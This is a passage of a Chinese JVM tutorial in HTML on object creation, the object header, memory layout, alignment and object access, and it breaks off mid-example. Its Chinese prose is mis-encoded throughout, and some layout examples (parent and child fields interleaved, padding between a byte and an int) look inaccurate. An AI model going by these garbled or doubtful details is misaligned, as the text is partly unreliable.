<p><strong>é—®é¢˜ï¼š</strong> å¤šä¸ªçº¿ç¨‹åŒæ—¶åˆ†é…å†…å­˜æ—¶ï¼Œå¯èƒ½å‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</p>
<p><strong>è§£å†³æ–¹æ¡ˆ1ï¼šCAS + å¤±è´¥é‡è¯•</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¼ªä»£ç </span>
<span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
    <span class="hljs-keyword">if</span> (CAS(æŒ‡é’ˆä½ç½®, é¢„æœŸå€¼, æ–°å€¼)) {
        <span class="hljs-comment">// åˆ†é…æˆåŠŸ</span>
        <span class="hljs-keyword">break</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// åˆ†é…å¤±è´¥ï¼Œé‡è¯•</span>
        <span class="hljs-keyword">continue</span>;
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆ2ï¼šTLABï¼ˆThread Local Allocation Bufferï¼‰</strong></p>
<p>TLABæ˜¯æ¯ä¸ªçº¿ç¨‹åœ¨EdenåŒºä¸­ç‹¬ç«‹çš„å†…å­˜åˆ†é…åŒºåŸŸã€‚</p>
<pre><code class="hljs language-ini" lang="ini">TLABï¼š

EdenåŒº: <span class="hljs-section">[TLAB1]</span> <span class="hljs-section">[TLAB2]</span> <span class="hljs-section">[TLAB3]</span> <span class="hljs-section">[å…±äº«åŒº]</span>
        çº¿ç¨‹1   çº¿ç¨‹2   çº¿ç¨‹3

æ¯ä¸ªçº¿ç¨‹æœ‰ç‹¬ç«‹çš„TLABï¼Œä¼˜å…ˆåœ¨æ­¤åˆ†é…ï¼Œå‡å°‘ç«äº‰
</code></pre>
<p><strong>TLABçš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>é¿å…å¤šçº¿ç¨‹åˆ†é…å†…å­˜æ—¶çš„ç«äº‰</li>
<li>æé«˜å†…å­˜åˆ†é…æ•ˆç‡</li>
<li>å‡å°‘åŒæ­¥å¼€é”€</li>
</ul>
<h4 data-id="heading-67">10.4 åˆå§‹åŒ–é›¶å€¼</h4>
<p><strong>åˆå§‹åŒ–è¿‡ç¨‹ï¼š</strong></p>
<p>å†…å­˜åˆ†é…å®Œæˆåï¼ŒJVMå°†åˆ†é…çš„å†…å­˜ç©ºé—´åˆå§‹åŒ–ä¸ºé›¶å€¼ï¼ˆä¸åŒ…æ‹¬å¯¹è±¡å¤´ï¼‰ã€‚</p>
<p><strong>åˆå§‹åŒ–çš„å€¼ï¼š</strong></p>
<ul>
<li>åŸºæœ¬ç±»å‹ï¼š0ã€falseã€0.0ç­‰</li>
<li>å¼•ç”¨ç±»å‹ï¼šnull</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦åˆå§‹åŒ–é›¶å€¼ï¼Ÿ</strong></p>
<p>ä¿è¯å¯¹è±¡çš„å®ä¾‹å­—æ®µå¯ä»¥ä¸èµ‹åˆå§‹å€¼å°±ç›´æ¥ä½¿ç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ZeroInit</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> value;      <span class="hljs-comment">// è‡ªåŠ¨åˆå§‹åŒ–ä¸º0</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> flag;   <span class="hljs-comment">// è‡ªåŠ¨åˆå§‹åŒ–ä¸ºfalse</span>
    <span class="hljs-keyword">private</span> Object obj;     <span class="hljs-comment">// è‡ªåŠ¨åˆå§‹åŒ–ä¸ºnull</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¸éœ€è¦å…ˆèµ‹å€¼</span>
        System.out.println(value);  <span class="hljs-comment">// è¾“å‡º0</span>
        System.out.println(flag);   <span class="hljs-comment">// è¾“å‡ºfalse</span>
        System.out.println(obj);    <span class="hljs-comment">// è¾“å‡ºnull</span>
    }
}
</code></pre>
<h4 data-id="heading-68">10.5 è®¾ç½®å¯¹è±¡å¤´</h4>
<p>å¯¹è±¡å¤´åŒ…å«ä¸¤éƒ¨åˆ†ä¿¡æ¯ï¼š</p>
<p><strong>1. Mark Wordï¼ˆæ ‡è®°å­—æ®µï¼‰</strong></p>
<p>å­˜å‚¨å¯¹è±¡çš„è¿è¡Œæ—¶æ•°æ®ï¼š</p>
<ul>
<li>å¯¹è±¡çš„hashCode</li>
<li>GCåˆ†ä»£å¹´é¾„</li>
<li>é”çŠ¶æ€æ ‡å¿—</li>
<li>çº¿ç¨‹æŒæœ‰çš„é”</li>
<li>åå‘çº¿ç¨‹ID</li>
<li>åå‘æ—¶é—´æˆ³</li>
</ul>
<p><strong>2. ç±»å‹æŒ‡é’ˆï¼ˆClass Pointerï¼‰</strong></p>
<p>æŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®ï¼ˆæ–¹æ³•åŒºä¸­çš„ç±»ä¿¡æ¯ï¼‰ã€‚</p>
<p><strong>3. æ•°ç»„é•¿åº¦ï¼ˆå¦‚æœæ˜¯æ•°ç»„ï¼‰</strong></p>
<p>å¦‚æœæ˜¯æ•°ç»„å¯¹è±¡ï¼Œå¯¹è±¡å¤´è¿˜åŒ…å«æ•°ç»„é•¿åº¦ã€‚</p>
<h4 data-id="heading-69">10.6 æ‰§è¡Œæ–¹æ³•</h4>
<p><strong>æ–¹æ³•çš„ä½œç”¨ï¼š</strong></p>
<p>æ–¹æ³•æ˜¯ç±»çš„æ„é€ å‡½æ•°ï¼Œåœ¨å¯¹è±¡åˆ›å»ºçš„æœ€åä¸€æ­¥æ‰§è¡Œã€‚</p>
<p><strong>æ‰§è¡Œå†…å®¹ï¼š</strong></p>
<ol>
<li>æŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿åˆå§‹åŒ–å¯¹è±¡</li>
<li>æ‰§è¡Œæ„é€ å‡½æ•°ä¸­çš„ä»£ç </li>
<li>æŒ‰ç…§å£°æ˜é¡ºåºåˆå§‹åŒ–å®ä¾‹å˜é‡</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">InitExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> value;
    <span class="hljs-keyword">private</span> String name;
    
    <span class="hljs-comment">// æ„é€ å‡½æ•°</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">InitExample</span><span class="hljs-params">(<span class="hljs-type">int</span> v, String n)</span> {
        <span class="hljs-built_in">this</span>.value = v;  <span class="hljs-comment">// æŒ‰ç…§ç¨‹åºå‘˜çš„æ„æ„¿åˆå§‹åŒ–</span>
        <span class="hljs-built_in">this</span>.name = n;
    }
}

<span class="hljs-comment">// å¯¹è±¡åˆ›å»ºè¿‡ç¨‹ï¼š</span>
<span class="hljs-comment">// 1. ç±»åŠ è½½æ£€æŸ¥</span>
<span class="hljs-comment">// 2. åˆ†é…å†…å­˜</span>
<span class="hljs-comment">// 3. åˆå§‹åŒ–é›¶å€¼ï¼ˆvalue=0, name=nullï¼‰</span>
<span class="hljs-comment">// 4. è®¾ç½®å¯¹è±¡å¤´</span>
<span class="hljs-comment">// 5. æ‰§è¡Œæ„é€ å‡½æ•°ï¼ˆvalue=10, name="test"ï¼‰</span>
<span class="hljs-type">InitExample</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitExample</span>(<span class="hljs-number">10</span>, <span class="hljs-string">"test"</span>);
</code></pre>
<h3 data-id="heading-70">11. å¯¹è±¡çš„å†…å­˜å¸ƒå±€</h3>
<h4 data-id="heading-71">11.1 å¯¹è±¡å†…å­˜å¸ƒå±€å›¾</h4>
<pre><code class="hljs language-scss" lang="scss">å¯¹è±¡å†…å­˜å¸ƒå±€ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹è±¡å¤´      â”‚ (Mark Word + ç±»å‹æŒ‡é’ˆ + æ•°ç»„é•¿åº¦)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å®ä¾‹æ•°æ®    â”‚ (å­—æ®µå€¼)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å¯¹é½å¡«å……    â”‚ (ä¿è¯<span class="hljs-number">8</span>å­—èŠ‚å¯¹é½)
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-72">11.2 å¯¹è±¡å¤´è¯¦è§£</h4>
<p><strong>1. Mark Wordï¼ˆæ ‡è®°å­—æ®µï¼‰</strong></p>
<p>Mark Wordæ˜¯å¯¹è±¡å¤´çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨å¯¹è±¡çš„è¿è¡Œæ—¶æ•°æ®ã€‚</p>
<p><strong>å­˜å‚¨å†…å®¹ï¼š</strong></p>





























<table><thead><tr><th>å†…å®¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>hashCode</strong></td><td>å¯¹è±¡çš„å“ˆå¸Œç </td></tr><tr><td><strong>GCå¹´é¾„</strong></td><td>å¯¹è±¡ç»å†çš„GCæ¬¡æ•°</td></tr><tr><td><strong>é”çŠ¶æ€</strong></td><td>åå‘é”ã€è½»é‡çº§é”ã€é‡é‡çº§é”ç­‰</td></tr><tr><td><strong>åå‘çº¿ç¨‹ID</strong></td><td>åå‘é”çš„çº¿ç¨‹ID</td></tr><tr><td><strong>åå‘æ—¶é—´æˆ³</strong></td><td>åå‘é”çš„æ—¶é—´æˆ³</td></tr></tbody></table>
<p><strong>Mark Wordçš„ç»“æ„ï¼ˆ64ä½JVMï¼‰ï¼š</strong></p>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚         <span class="hljs-selector-tag">Mark</span> Word (<span class="hljs-number">64</span>ä½)            â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  é”çŠ¶æ€  â”‚  å…¶ä»–ä¿¡æ¯                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ— é”    â”‚ <span class="hljs-built_in">hashCode</span>(<span class="hljs-number">31</span>ä½) + GCå¹´é¾„(<span class="hljs-number">4</span>ä½) + ...â”‚
â”‚ åå‘é”  â”‚ çº¿ç¨‹<span class="hljs-built_in">ID</span>(<span class="hljs-number">54</span>ä½) + <span class="hljs-built_in">Epoch</span>(<span class="hljs-number">2</span>ä½) + ...â”‚
â”‚ è½»é‡çº§é”â”‚ æŒ‡å‘æ ˆä¸­é”è®°å½•çš„æŒ‡é’ˆ(<span class="hljs-number">62</span>ä½) + ...â”‚
â”‚ é‡é‡çº§é”â”‚ æŒ‡å‘monitorçš„æŒ‡é’ˆ(<span class="hljs-number">62</span>ä½) + ...â”‚
â”‚ GCæ ‡è®°  â”‚ ç©º(ä¸éœ€è¦è®°å½•ä¿¡æ¯)        â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MarkWordExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> value;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
        
        <span class="hljs-comment">// Mark Wordå­˜å‚¨ï¼š</span>
        <span class="hljs-comment">// - objçš„hashCode</span>
        <span class="hljs-comment">// - GCå¹´é¾„ï¼ˆåˆå§‹ä¸º0ï¼‰</span>
        <span class="hljs-comment">// - é”çŠ¶æ€ï¼ˆåˆå§‹ä¸ºæ— é”ï¼‰</span>
        
        <span class="hljs-comment">// è°ƒç”¨hashCode()æ—¶ï¼Œå¦‚æœhashCodeä¸º0ï¼Œä¼šè®¡ç®—å¹¶å†™å…¥Mark Word</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> obj.hashCode();
        
        <span class="hljs-comment">// ç»å†GCåï¼ŒGCå¹´é¾„å¢åŠ </span>
        <span class="hljs-comment">// åŠ é”æ—¶ï¼Œé”çŠ¶æ€æ”¹å˜</span>
    }
}
</code></pre>
<p><strong>2. ç±»å‹æŒ‡é’ˆï¼ˆClass Pointerï¼‰</strong></p>
<p>ç±»å‹æŒ‡é’ˆæŒ‡å‘å¯¹è±¡æ‰€å±çš„ç±»å…ƒæ•°æ®ï¼ˆæ–¹æ³•åŒºä¸­çš„ç±»ä¿¡æ¯ï¼‰ã€‚</p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>JVMé€šè¿‡ç±»å‹æŒ‡é’ˆç¡®å®šå¯¹è±¡æ˜¯å“ªä¸ªç±»çš„å®ä¾‹</li>
<li>æ”¯æŒinstanceofæ“ä½œ</li>
<li>æ”¯æŒè™šæ–¹æ³•åˆ†æ´¾</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassPointerExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);
        
        <span class="hljs-comment">// é€šè¿‡ç±»å‹æŒ‡é’ˆï¼ŒJVMçŸ¥é“objå®é™…ä¸Šæ˜¯Stringç±»å‹</span>
        <span class="hljs-keyword">if</span> (obj <span class="hljs-keyword">instanceof</span> String) {  <span class="hljs-comment">// æ£€æŸ¥ç±»å‹æŒ‡é’ˆ</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> (String) obj;  <span class="hljs-comment">// ç±»å‹è½¬æ¢</span>
        }
    }
}
</code></pre>
<p><strong>3. æ•°ç»„é•¿åº¦ï¼ˆArray Lengthï¼‰</strong></p>
<p>ä»…å½“å¯¹è±¡æ˜¯æ•°ç»„æ—¶ï¼Œå¯¹è±¡å¤´æ‰åŒ…å«æ•°ç»„é•¿åº¦ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ArrayLength</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">int</span>[] array = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">10</span>];  <span class="hljs-comment">// æ•°ç»„å¯¹è±¡ï¼Œå¯¹è±¡å¤´åŒ…å«æ•°ç»„é•¿åº¦10</span>
        
        <span class="hljs-comment">// å¯¹è±¡å¤´ç»“æ„ï¼š</span>
        <span class="hljs-comment">// - Mark Word</span>
        <span class="hljs-comment">// - ç±»å‹æŒ‡é’ˆï¼ˆæŒ‡å‘int[]ç±»ï¼‰</span>
        <span class="hljs-comment">// - æ•°ç»„é•¿åº¦ï¼ˆ10ï¼‰</span>
        <span class="hljs-comment">// - å®ä¾‹æ•°æ®ï¼ˆ10ä¸ªintå€¼ï¼‰</span>
    }
}
</code></pre>
<h4 data-id="heading-73">11.3 å®ä¾‹æ•°æ®</h4>
<p><strong>å®ä¾‹æ•°æ®ï¼ˆInstance Dataï¼‰å­˜å‚¨ï¼š</strong></p>
<p>å¯¹è±¡çš„å®ä¾‹æ•°æ®å­˜å‚¨å¯¹è±¡çš„å®é™…å­—æ®µå€¼ã€‚</p>
<p><strong>å­˜å‚¨é¡ºåºï¼š</strong></p>
<ol>
<li><strong>çˆ¶ç±»å­—æ®µåœ¨å‰</strong>ï¼šçˆ¶ç±»ç»§æ‰¿çš„å­—æ®µåœ¨å­ç±»å­—æ®µä¹‹å‰</li>
<li><strong>ç›¸åŒå®½åº¦çš„å­—æ®µåˆ†é…åœ¨ä¸€èµ·</strong>ï¼šlong/doubleã€int/floatã€short/charã€byte/boolean</li>
<li><strong>å­ç±»å­—æ®µåœ¨å</strong>ï¼šå­ç±»å®šä¹‰çš„å­—æ®µåœ¨çˆ¶ç±»å­—æ®µä¹‹å</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span> {
    <span class="hljs-type">int</span> parentInt;      <span class="hljs-comment">// 4å­—èŠ‚</span>
    <span class="hljs-type">long</span> parentLong;    <span class="hljs-comment">// 8å­—èŠ‚</span>
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Parent</span> {
    <span class="hljs-type">int</span> childInt;       <span class="hljs-comment">// 4å­—èŠ‚</span>
    <span class="hljs-type">long</span> childLong;     <span class="hljs-comment">// 8å­—èŠ‚</span>
}

<span class="hljs-comment">// å¯¹è±¡å¸ƒå±€ï¼ˆå®ä¾‹æ•°æ®éƒ¨åˆ†ï¼‰ï¼š</span>
<span class="hljs-comment">// 1. parentInt (4å­—èŠ‚)</span>
<span class="hljs-comment">// 2. childInt (4å­—èŠ‚) - ç›¸åŒå®½åº¦æ”¾åœ¨ä¸€èµ·</span>
<span class="hljs-comment">// 3. parentLong (8å­—èŠ‚)</span>
<span class="hljs-comment">// 4. childLong (8å­—èŠ‚)</span>
</code></pre>
<h4 data-id="heading-74">11.4 å¯¹é½å¡«å……</h4>
<p><strong>å¯¹é½å¡«å……çš„ä½œç”¨ï¼š</strong></p>
<p>å¯¹è±¡å¤§å°å¿…é¡»æ˜¯8å­—èŠ‚çš„æ•´æ•°å€ï¼Œå¯¹é½å¡«å……ç”¨äºæ»¡è¶³è¿™ä¸ªè¦æ±‚ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å¯¹é½ï¼Ÿ</strong></p>
<ol>
<li><strong>æé«˜è®¿é—®æ•ˆç‡</strong>ï¼šå¯¹é½åçš„å†…å­˜è®¿é—®é€Ÿåº¦æ›´å¿«</li>
<li><strong>ç¡¬ä»¶è¦æ±‚</strong>ï¼šæŸäº›CPUè¦æ±‚æ•°æ®å¯¹é½</li>
<li><strong>å‡å°‘å†…å­˜ç¢ç‰‡</strong>ï¼šå¯¹é½å¯ä»¥å‡å°‘å†…å­˜ç¢ç‰‡</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PaddingExample</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span> b;     <span class="hljs-comment">// 1å­—èŠ‚</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> i;      <span class="hljs-comment">// 4å­—èŠ‚</span>
    
    <span class="hljs-comment">// å¯¹è±¡å¤§å°è®¡ç®—ï¼š</span>
    <span class="hljs-comment">// å¯¹è±¡å¤´ï¼š12å­—èŠ‚ï¼ˆå‡è®¾å‹ç¼©åï¼‰</span>
    <span class="hljs-comment">// bï¼š1å­—èŠ‚</span>
    <span class="hljs-comment">// å¡«å……ï¼š3å­—èŠ‚ï¼ˆä¸ºäº†å¯¹é½ï¼‰</span>
    <span class="hljs-comment">// iï¼š4å­—èŠ‚</span>
    <span class="hljs-comment">// æ€»å¤§å°ï¼š12 + 1 + 3 + 4 = 20å­—èŠ‚</span>
    
    <span class="hljs-comment">// ä½†å¯¹è±¡å¤§å°å¿…é¡»æ˜¯8çš„å€æ•°ï¼Œæ‰€ä»¥ï¼š</span>
    <span class="hljs-comment">// å®é™…å¤§å°ï¼š24å­—èŠ‚ï¼ˆ20 + 4å­—èŠ‚å¯¹é½å¡«å……ï¼‰</span>
}
</code></pre>
<h4 data-id="heading-75">11.5 å¯¹è±¡å¤§å°çš„è®¡ç®—</h4>
<p><strong>è®¡ç®—å…¬å¼ï¼š</strong></p>
<pre><code class="hljs">å¯¹è±¡å¤§å° = å¯¹è±¡å¤´ + å®ä¾‹æ•°æ® + å¯¹é½å¡«å……
</code></pre>
<p><strong>å®é™…è®¡ç®—ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SizeCalculation</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">byte</span> b;      <span class="hljs-comment">// 1å­—èŠ‚</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> i;       <span class="hljs-comment">// 4å­—èŠ‚</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">long</span> l;      <span class="hljs-comment">// 8å­—èŠ‚</span>
    <span class="hljs-keyword">private</span> Object ref;  <span class="hljs-comment">// å¼•ç”¨4å­—èŠ‚ï¼ˆå‹ç¼©åï¼‰æˆ–8å­—èŠ‚ï¼ˆæœªå‹ç¼©ï¼‰</span>
    
    <span class="hljs-comment">// 64ä½JVMï¼Œå¼€å¯æŒ‡é’ˆå‹ç¼©ï¼š</span>
    <span class="hljs-comment">// å¯¹è±¡å¤´ï¼š12å­—èŠ‚ï¼ˆMark Word 8å­—èŠ‚ + ç±»å‹æŒ‡é’ˆ 4å­—èŠ‚ï¼‰</span>
    <span class="hljs-comment">// bï¼š1å­—èŠ‚</span>
    <span class="hljs-comment">// å¡«å……ï¼š3å­—èŠ‚</span>
    <span class="hljs-comment">// iï¼š4å­—èŠ‚</span>
    <span class="hljs-comment">// lï¼š8å­—èŠ‚</span>
    <span class="hljs-comment">// refï¼š4å­—èŠ‚</span>
    <span class="hljs-comment">// å¯¹é½å¡«å……ï¼š0å­—èŠ‚ï¼ˆå·²ç»æ˜¯8çš„å€æ•°ï¼‰</span>
    <span class="hljs-comment">// æ€»å¤§å°ï¼š12 + 1 + 3 + 4 + 8 + 4 = 32å­—èŠ‚</span>
}
</code></pre>
<h3 data-id="heading-76">12. å¯¹è±¡çš„è®¿é—®å®šä½</h3>
<h4 data-id="heading-77">12.1 å¥æŸ„è®¿é—®æ–¹å¼å›¾</h4>
<pre><code class="hljs language-markdown" lang="markdown">å¥æŸ„è®¿é—®ï¼š

æ ˆå¼•ç”¨ â†’ å¥æŸ„æ±  â†’ å¯¹è±¡å®ä¾‹æ•°æ®
<span class="hljs-code">              â†’ ç±»å‹æ•°æ®
</span>
éœ€è¦ä¸¤æ¬¡è®¿é—®
</code></pre>
<p><strong>å¥æŸ„è®¿é—®çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>å¼•ç”¨ç¨³å®šï¼šå¯¹è±¡ç§»åŠ¨æ—¶åªéœ€æ›´æ–°å¥æŸ„ä¸­çš„æŒ‡é’ˆ</li>
<li>GCæ•ˆç‡é«˜ï¼šGCæ—¶åªéœ€ç§»åŠ¨å¯¹è±¡ï¼Œä¸éœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨</li>
</ul>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>éœ€è¦ä¸¤æ¬¡è®¿é—®ï¼šå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡</li>
<li>æ•ˆç‡è¾ƒä½ï¼šå¤šä¸€æ¬¡é—´æ¥è®¿é—®</li>
</ul>
</li>
</ul>
<h4 data-id="heading-78">12.2 ç›´æ¥æŒ‡é’ˆè®¿é—®æ–¹å¼å›¾ï¼ˆHotSpotä½¿ç”¨ï¼‰</h4>
<pre><code class="hljs">ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼ˆHotSpotï¼‰ï¼š

æ ˆå¼•ç”¨ â†’ å¯¹è±¡å®ä¾‹æ•°æ® â†’ ç±»å‹æ•°æ®ï¼ˆé€šè¿‡å¯¹è±¡å¤´ä¸­ç±»å‹æŒ‡é’ˆï¼‰

åªéœ€ä¸€æ¬¡è®¿é—®
</code></pre>
<p><strong>ç›´æ¥æŒ‡é’ˆè®¿é—®çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼š</p>
<ul>
<li>è®¿é—®é€Ÿåº¦å¿«ï¼šåªéœ€ä¸€æ¬¡è®¿é—®</li>
<li>æ•ˆç‡é«˜ï¼šå‡å°‘é—´æ¥è®¿é—®çš„å¼€é”€</li>
</ul>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼š</p>
<ul>
<li>å¯¹è±¡ç§»åŠ¨æ—¶éœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨</li>
<li>GCæ—¶å¼€é”€è¾ƒå¤§ï¼šéœ€è¦æ›´æ–°æ‰€æœ‰æŒ‡å‘è¯¥å¯¹è±¡çš„å¼•ç”¨</li>
</ul>
</li>
</ul>
<h4 data-id="heading-79">12.3 ä¸¤ç§æ–¹å¼çš„å¯¹æ¯”</h4>



































<table><thead><tr><th>ç‰¹æ€§</th><th>å¥æŸ„è®¿é—®</th><th>ç›´æ¥æŒ‡é’ˆè®¿é—®</th></tr></thead><tbody><tr><td><strong>è®¿é—®æ¬¡æ•°</strong></td><td>ä¸¤æ¬¡ï¼ˆå…ˆè®¿é—®å¥æŸ„ï¼Œå†è®¿é—®å¯¹è±¡ï¼‰</td><td>ä¸€æ¬¡ï¼ˆç›´æ¥è®¿é—®å¯¹è±¡ï¼‰</td></tr><tr><td><strong>è®¿é—®é€Ÿåº¦</strong></td><td>è¾ƒæ…¢</td><td>è¾ƒå¿«</td></tr><tr><td><strong>å¼•ç”¨ç¨³å®šæ€§</strong></td><td>å¼•ç”¨ä¸å˜ï¼Œå¯¹è±¡ç§»åŠ¨åªéœ€æ›´æ–°å¥æŸ„</td><td>å¼•ç”¨ç›´æ¥æŒ‡å‘å¯¹è±¡</td></tr><tr><td><strong>GCå¼€é”€</strong></td><td>è¾ƒå°ï¼ˆåªéœ€ç§»åŠ¨å¯¹è±¡ï¼Œæ›´æ–°å¥æŸ„ï¼‰</td><td>è¾ƒå¤§ï¼ˆéœ€è¦æ›´æ–°æ‰€æœ‰å¼•ç”¨ï¼‰</td></tr><tr><td><strong>å†…å­˜å ç”¨</strong></td><td>è¾ƒå¤§ï¼ˆéœ€è¦é¢å¤–çš„å¥æŸ„æ± ï¼‰</td><td>è¾ƒå°ï¼ˆä¸éœ€è¦å¥æŸ„æ± ï¼‰</td></tr></tbody></table>
<p><strong>HotSpotä¸ºä»€ä¹ˆä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼Ÿ</strong></p>
<p>HotSpotè™šæ‹Ÿæœºä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼Œä¸»è¦åŸå› ï¼š</p>
<ol>
<li><strong>æ€§èƒ½ä¼˜å…ˆ</strong>ï¼šç›´æ¥è®¿é—®é€Ÿåº¦å¿«ï¼Œå‡å°‘é—´æ¥è®¿é—®å¼€é”€</li>
<li><strong>å¯¹è±¡ç§»åŠ¨è¾ƒå°‘</strong>ï¼šç°ä»£GCç®—æ³•ï¼ˆå¦‚G1ï¼‰å¯ä»¥æ›´å¥½åœ°å¤„ç†å¯¹è±¡ç§»åŠ¨</li>
<li><strong>ç®€å•é«˜æ•ˆ</strong>ï¼šå®ç°ç®€å•ï¼Œè®¿é—®æ•ˆç‡é«˜</li>
</ol>
<p><strong>å®é™…åº”ç”¨ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AccessExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
        
        <span class="hljs-comment">// HotSpotä½¿ç”¨ç›´æ¥æŒ‡é’ˆè®¿é—®ï¼š</span>
